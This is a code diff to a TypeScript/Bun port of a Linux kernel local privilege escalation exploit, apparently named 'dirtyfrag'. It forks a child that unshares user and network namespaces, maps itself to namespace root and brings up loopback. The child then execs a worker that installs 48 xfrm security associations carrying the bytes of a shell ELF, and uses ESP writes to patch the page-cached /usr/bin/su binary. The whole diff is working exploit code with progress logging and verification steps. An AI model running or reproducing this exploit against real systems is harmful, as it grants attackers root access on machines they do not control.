@@ -178,6 +178,12 @@ export const { symbols: C } = dlopen("libc.so.6", {
   },
   __errno_location: { returns: FFIType.ptr, args: [] },
 
+  // execve(path, argv[], envp[])
+  execve: {
+    returns: FFIType.i32,
+    args: [FFIType.ptr, FFIType.ptr, FFIType.ptr],
+  },
+
   // ---- exec (max-arity single declarations, pass null for unused trailing args) ----
   // execlp(file, arg0, arg1, arg2, arg3, NULL) — covers 0..4 real args
   execlp: {
@@ -885,43 +891,47 @@ function verifyByte(path: string, offset: number, want: number): number {
 
 // ── corrupt_su ────────────────────────────────────────────────────────────────
 
-function corruptSu(): number {
-  progress("corruptSu: unshare user+net namespace...");
-  setupUsernsNetns();
+// ── xfrm worker: runs inside the new namespace, does SA install + ESP writes ──
+
+export function xfrmWorkerMain(): number {
+  // We are a fresh Bun process that inherited the user+net namespace created
+  // by the fork child.  We have CAP_NET_ADMIN within that namespace.
+  progress("xfrm-worker: uid=" + (C.getuid() as number) +
+           " euid=" + (C.geteuid() as number) + " (namespace root)");
+
   C.usleep(100 * 1000);
 
-  const count = PAYLOAD_LEN / 4; // 48 SAs
-  progress(`corruptSu: installing ${count} xfrm SAs...`);
+  const count = PAYLOAD_LEN / 4;
+  progress(`xfrm-worker: installing ${count} xfrm SAs...`);
 
   for (let i = 0; i < count; i++) {
-    const spi = (0xdeadbe10 + i) >>> 0;
-    const seqhi =
-      ((SHELL_ELF[i * 4 + 0] << 24) |
-        (SHELL_ELF[i * 4 + 1] << 16) |
-        (SHELL_ELF[i * 4 + 2] << 8) |
-        SHELL_ELF[i * 4 + 3]) >>>
-      0;
+    const spi   = (0xDEADBE10 + i) >>> 0;
+    const seqhi = (
+      (SHELL_ELF[i * 4 + 0] << 24) |
+      (SHELL_ELF[i * 4 + 1] << 16) |
+      (SHELL_ELF[i * 4 + 2] <<  8) |
+       SHELL_ELF[i * 4 + 3]
+    ) >>> 0;
     if (addXfrmSa(spi, seqhi) < 0) {
-      progress(`corruptSu: add_xfrm_sa #${i} FAILED`);
-      return -1;
+      progress(`xfrm-worker: SA #${i} FAILED (${errStr()})`);
+      return 2;
     }
+    if (i % 16 === 15) progress(`xfrm-worker: SA ${i + 1}/${count} done`);
   }
-  progress(`corruptSu: ${count} SAs installed, triggering writes...`);
+  progress(`xfrm-worker: ${count} SAs installed, triggering writes...`);
 
   for (let i = 0; i < count; i++) {
-    const spi = (0xdeadbe10 + i) >>> 0;
+    const spi = (0xDEADBE10 + i) >>> 0;
     const off = PATCH_OFFSET + i * 4;
     if (doOneWrite(TARGET_PATH, off, spi) < 0) {
-      progress(`corruptSu: doOneWrite #${i} @ 0x${off.toString(16)} FAILED`);
-      return -1;
+      progress(`xfrm-worker: write #${i} @ 0x${off.toString(16)} FAILED`);
+      return 2;
     }
-    if (i % 16 === 15) progress(`corruptSu: write ${i + 1}/${count} done`);
+    if (i % 16 === 15) progress(`xfrm-worker: write ${i + 1}/${count} done`);
   }
-  progress(`corruptSu: wrote ${PAYLOAD_LEN} bytes to ${TARGET_PATH}`);
+  progress(`xfrm-worker: wrote ${PAYLOAD_LEN} bytes to ${TARGET_PATH}`);
   return 0;
 }
-
-// ── su_lpe_main ───────────────────────────────────────────────────────────────
 
 export function suLpeMain(argv: string[]): number {
   for (const a of argv) {
@@ -929,31 +939,115 @@ export function suLpeMain(argv: string[]): number {
   }
   if (getEnv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;
 
-  // Use Bun.spawnSync to run the corruption in a fresh Bun process — mirrors
-  // the C code's fork()+child pattern but avoids the multithreaded JSC issue.
-  // The child process calls unshare(CLONE_NEWUSER|CLONE_NEWNET) which changes
-  // only its own namespaces; the parent event loop is completely unaffected.
-  progress("suLpeMain: spawning corruption worker subprocess...");
-  const worker = Bun.spawnSync(
-    [process.execPath, "--bun", import.meta.path, "--corruption-worker"],
-    { stdout: "inherit", stderr: "inherit", stdin: "ignore" },
-  );
-  const rc = worker.exitCode ?? -1;
-  progress(`suLpeMain: worker exited with code=${rc} (signal=${worker.signalCode})`);
-  if (rc !== 0) {
-    progress("suLpeMain: corruption worker FAILED");
-    return 1;
+  const realUid = C.getuid() as number;
+  const realGid = C.getgid() as number;
+
+  // ── Pre-build ALL data the fork child will need BEFORE fork() ────────────
+  // Rule: after fork(), the child is single-threaded. unshare(CLONE_NEWUSER)
+  // requires single-threaded. But any JS allocation post-fork can trigger the
+  // JSC GC which tries to lock a dead thread → SIGILL.
+  // Solution: pre-build every Buffer and get native pointers before fork.
+
+  const _setgroupsPath = cstr("/proc/self/setgroups");
+  const _setgroupsData = cstr("deny");
+  const _uidMapPath    = cstr("/proc/self/uid_map");
+  const _uidMapData    = cstr(`0 ${realUid} 1`);
+  const _gidMapPath    = cstr("/proc/self/gid_map");
+  const _gidMapData    = cstr(`0 ${realGid} 1`);
+  const _loIfr         = Buffer.alloc(SIZEOF_IFREQ, 0);
+  writeStr(_loIfr, 0, "lo");
+
+  // execve argv: ["bun", "--bun", scriptPath, "--xfrm-worker", NULL]
+  const _ea0 = cstr("bun");
+  const _ea1 = cstr("--bun");
+  const _ea2 = cstr(import.meta.path);
+  const _ea3 = cstr("--xfrm-worker");
+  const _execPath = cstr(process.execPath);
+
+  // Build native argv[] array (5 ptr slots: 4 args + NULL terminator)
+  const _argvBuf = Buffer.alloc(5 * 8, 0);
+  {
+    const dv = new DataView(_argvBuf.buffer, _argvBuf.byteOffset);
+    dv.setBigUint64( 0, BigInt(ptr(_ea0)), true);
+    dv.setBigUint64( 8, BigInt(ptr(_ea1)), true);
+    dv.setBigUint64(16, BigInt(ptr(_ea2)), true);
+    dv.setBigUint64(24, BigInt(ptr(_ea3)), true);
+    dv.setBigUint64(32, 0n,                true); // NULL
   }
 
-  progress("suLpeMain: verifying patch...");
-  if (
-    verifyByte(TARGET_PATH, ENTRY_OFFSET, 0x31) !== 0 ||
-    verifyByte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) !== 0
-  ) {
-    progress("suLpeMain: post-write verify FAILED (target unchanged)");
-    return 1;
+  // Freeze native pointers before fork so child never calls ptr() on anything
+  const _pExecPath  = ptr(_execPath);
+  const _pArgv      = ptr(_argvBuf);
+  const _pSetgPath  = ptr(_setgroupsPath);
+  const _pSetgData  = ptr(_setgroupsData);
+  const _pUidPath   = ptr(_uidMapPath);
+  const _pUidData   = ptr(_uidMapData);
+  const _pGidPath   = ptr(_gidMapPath);
+  const _pGidData   = ptr(_gidMapData);
+  const _uidDataLen = BigInt(_uidMapData.length - 1);  // exclude null byte
+  const _gidDataLen = BigInt(_gidMapData.length - 1);
+  const _pLoIfr     = ptr(_loIfr);
+
+  progress(`suLpeMain: fork() — child will unshare+exec xfrm-worker (uid=${realUid})`);
+
+  const cpid = C.fork() as number;
+  if (cpid < 0) { progress("suLpeMain: fork FAILED"); return 1; }
+
+  if (cpid === 0) {
+    // ── CHILD (single-threaded post-fork) ─────────────────────────────────
+    // ONLY raw FFI calls using pre-frozen pointers. Zero JS allocations.
+    // Any JS alloc could trigger JSC GC on a dead GC thread → SIGILL.
+
+    // 1. unshare — works because we are single-threaded
+    if ((C.unshare(CLONE_NEWUSER | CLONE_NEWNET) as number) < 0) C._exit(1);
+
+    // 2. Map namespace uid=0 → host uid
+    {
+      let fd = _openFFI(_pSetgPath, O_WRONLY, 0) as number;
+      if (fd >= 0) { C.write(fd, _pSetgData, 4n); C.close(fd); }
+
+      fd = _openFFI(_pUidPath, O_WRONLY, 0) as number;
+      if (fd < 0) C._exit(2);
+      C.write(fd, _pUidData, _uidDataLen); C.close(fd);
+
+      fd = _openFFI(_pGidPath, O_WRONLY, 0) as number;
+      if (fd < 0) C._exit(3);
+      C.write(fd, _pGidData, _gidDataLen); C.close(fd);
+    }
+
+    // 3. Bring up lo in the new netns
+    {
+      const s = C.socket(AF_INET, SOCK_DGRAM, 0) as number;
+      if (s >= 0) {
+        C.ioctl(s, SIOCGIFFLAGS, _pLoIfr);
+        const flags = _loIfr.readInt16LE(IFNAMSIZ);
+        _loIfr.writeInt16LE(flags | IFF_UP | IFF_RUNNING, IFNAMSIZ);
+        C.ioctl(s, SIOCSIFFLAGS, _pLoIfr);
+        C.close(s);
+      }
+    }
+
+    // 4. exec into a fresh Bun process — inherits the new user+net namespace.
+    //    Fresh Bun is multi-threaded but no longer needs unshare.
+    C.execve(_pExecPath, _pArgv, 0);
+    C._exit(127); // execve failed
   }
-  progress(`suLpeMain: /usr/bin/su page-cache patched at entry 0x${ENTRY_OFFSET.toString(16)}`);
+
+  // ── PARENT ────────────────────────────────────────────────────────────────
+  progress(`suLpeMain: waiting for xfrm-worker (pid=${cpid})...`);
+  const cstatus = Buffer.alloc(4, 0);
+  C.waitpid(cpid, ptr(cstatus), 0);
+  const st = cstatus.readInt32LE(0);
+  const rc = WIFEXITED(st) && WEXITSTATUS(st) === 0 ? 0 : 1;
+  progress(`suLpeMain: worker done — status=0x${st.toString(16)} wifexited=${WIFEXITED(st)} wexitstatus=${WEXITSTATUS(st)} rc=${rc}`);
+  if (rc !== 0) { progress("suLpeMain: xfrm-worker FAILED"); return 1; }
+
+  progress("suLpeMain: verifying patch...");
+  if (verifyByte(TARGET_PATH, ENTRY_OFFSET, 0x31) !== 0 ||
+      verifyByte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) !== 0) {
+    progress("suLpeMain: post-write verify FAILED"); return 1;
+  }
+  progress(`suLpeMain: /usr/bin/su page-cache patched`);
   return 0;
 }
 
@@ -2710,15 +2804,12 @@ export function main(argv: string[]): number {
 if (import.meta.main) {
   const args = process.argv.slice(2);
 
-  // ── corruption worker subprocess ──────────────────────────────────────────
-  // Launched by suLpeMain via Bun.spawnSync — mirrors the C fork() child.
-  // Runs in a fresh Bun process so unshare(CLONE_NEWUSER|CLONE_NEWNET) only
-  // affects THIS process, not the parent event loop.
-  if (args.includes("--corruption-worker")) {
-    progress("corruption-worker: starting corruptSu()");
-    const rc = corruptSu();
-    progress(`corruption-worker: corruptSu returned ${rc}`);
-    process.exit(rc === 0 ? 0 : 2);
+  // ── xfrm-worker ───────────────────────────────────────────────────────────
+  // exec'd by the fork child after it set up the user+net namespace.
+  // Runs inside the new namespace with CAP_NET_ADMIN — installs xfrm SAs and
+  // performs the ESP dirtyfrag writes.  Full Bun runtime available here.
+  if (args.includes("--xfrm-worker")) {
+    process.exit(xfrmWorkerMain());
   }
 
   progress(
